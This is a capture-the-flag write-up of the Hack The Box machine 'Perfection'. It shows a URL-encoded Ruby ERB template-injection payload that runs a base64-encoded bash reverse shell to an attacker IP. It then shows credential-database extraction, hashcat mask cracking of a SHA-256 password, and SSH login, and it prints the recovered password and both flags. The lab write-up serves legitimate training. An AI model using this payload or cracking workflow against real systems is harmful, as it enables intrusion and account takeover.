# Perfection

## Introduction

This writeup details the exploitation process of the "Perfection" box on Hack The Box. The challenge is categorized as easy difficulty and involves several stages.

<figure><img src="../.gitbook/assets/image (6) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Enumeration

### Nmap

```bash
nmap -A -Pn 10.10.11.253 
```

<figure><img src="../.gitbook/assets/image (7) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (8) (1) (1).png" alt=""><figcaption></figcaption></figure>

I found the website and I check all the function and I find [http://10.10.11.253/weighted-grade](http://10.10.11.253/weighted-grade)

<figure><img src="../.gitbook/assets/image (9) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Curl (HEADER)

```bash
curl -I 10.10.11.253
```

<figure><img src="../.gitbook/assets/image (12) (1) (1).png" alt=""><figcaption></figcaption></figure>

And intercept with burp suite to see it have potential RCE. And I found vulnerability that need to use URL-encoding. [https://www.exploit-db.com/exploits/5215](https://www.exploit-db.com/exploits/5215)

<figure><img src="../.gitbook/assets/image (10) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Exploitation

```bash
#PAYLOAD
a%0A;<%25%3d+system("echo+IyEvYmluL2Jhc2gKYmFzaCAgLWMgImJhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuMTYvNDQ0NCAwPiYxIgo=+|+base64+-d+|+bash")+%25>
```

* %0A = blank
* %25 = %
* %3d = =
* use <%= system(' ') %> for SSTI (Server Side Template Injection) of RUBY ([https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#erb-ruby](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#erb-ruby))
* IyEvYmluL2Jhc2gKYmFzaCAgLWMgImJhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuMTYvNDQ0NCAwPiYxIgo= : #!/bin/bash bash -c "bash -i >& /dev/tcp/10.10.16.16/4444 0>&1" ([https://www.revshells.com/](https://www.revshells.com/))

<pre class="language-bash"><code class="lang-bash"><strong>#Plaintext PAYLOAD
</strong><strong>a
</strong><strong>;&#x3C;%= system("echo IyEvYmluL2Jhc2gKYmFzaCAgLWMgImJhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuMTYvNDQ0NCAwPiYxIgo= | base64 -d | bash") %>
</strong></code></pre>

<figure><img src="../.gitbook/assets/image (11) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (13) (1) (1).png" alt=""><figcaption><p>BINGO!</p></figcaption></figure>

### User Flag

<figure><img src="../.gitbook/assets/image (14) (1) (1).png" alt=""><figcaption><p>99dea3053881db4616c908de8b15467d</p></figcaption></figure>

## Privilege Escalation

### Found the Database

```bash
strings /home/susan/Migration/pupilpath_credentials.db
```

<figure><img src="../.gitbook/assets/image (15) (1) (1).png" alt=""><figcaption><p>Susan Miller: abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f</p></figcaption></figure>

### Found the password format

```bash
cd /var/mail
cat susan
```

<figure><img src="../.gitbook/assets/image (16) (1) (1).png" alt=""><figcaption><p>{firstname}<em>{firstname backwards}</em>{randomly generated integer between 1 and 1,000,000,000}</p></figcaption></figure>

### Crack password:

```bash
hashcat -m 1400 -a 3 abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f susan_nasus_?d?d?d?d?d?d?d?d?d
PASSWORD: susan_nasus_413759210
```

* \-m 1400 (SHA-256 hashes)
* \-a 3 (brute force)
* susan\_nasus\_?d?d?d?d?d?d?d?d?d : {firstname}_{firstname backwards}_{randomly generated integer between 1 and 1,000,000,000}

### Connect with SSH

```bash
ssh susan@10.10.11.253 
```

<figure><img src="../.gitbook/assets/image (17) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Root Flag

<figure><img src="../.gitbook/assets/image (18) (1) (1).png" alt=""><figcaption><p>ae84cdfdc078c0790f713ee089011b7c</p></figcaption></figure>

## Follow Me

* **LinkedIn**: [https://www.linkedin.com/in/waris-damkham/](https://www.linkedin.com/in/waris-damkham/)
* **Website**: [https://waris-damkham.netlify.app/](https://waris-damkham.netlify.app/#home)
